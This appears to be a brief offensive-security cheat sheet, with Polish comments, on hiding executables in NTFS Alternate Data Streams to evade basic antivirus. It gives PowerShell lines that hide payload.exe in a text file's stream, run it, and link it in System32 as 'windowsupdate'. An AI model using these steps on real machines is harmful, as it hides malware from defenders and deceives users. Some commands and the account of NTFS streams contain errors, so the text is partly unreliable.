
# Alternate Data Streams (ADS)
https://sekurak.pl/alternate-data-streams-ads/

Evade very basic detection.

Alternate Data Streams (ADS) is an NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System).  
Any file created on an NTFS formatted drive will have two different forks/streams:

- Data stream - Default stream that contains the data of the file.
- Resource stream - Typically contains the metadata of the file.

This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file.  
This technique is usually used to evade basic signature based AVs and static scanning tools.

```PS
notepad test.txt:secret.txt # acces resource stream (secret.txt) of test.txt file
```
```PS
payload.exe > windowslog.txt:winpeas.exe # ukryj payload.exe w ADS pliku windowslog.txt, nazwa ADS to winpeas.exe
start windowslog.txt:winpeas.exe # uruchom winpeas.exe ukryty jako *Resource Stream* w pliku aindowslog.txt
```
```PS
# utworzenie symbolic linku do windowslog.txt:winpeas.exe tak aby po wpisaniu komendy *windowsupdate* do CLI uruchamiany by≈Ç windowslog.txt:winpeas.exe
cd C:Windows\system32
mlink windowsupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```

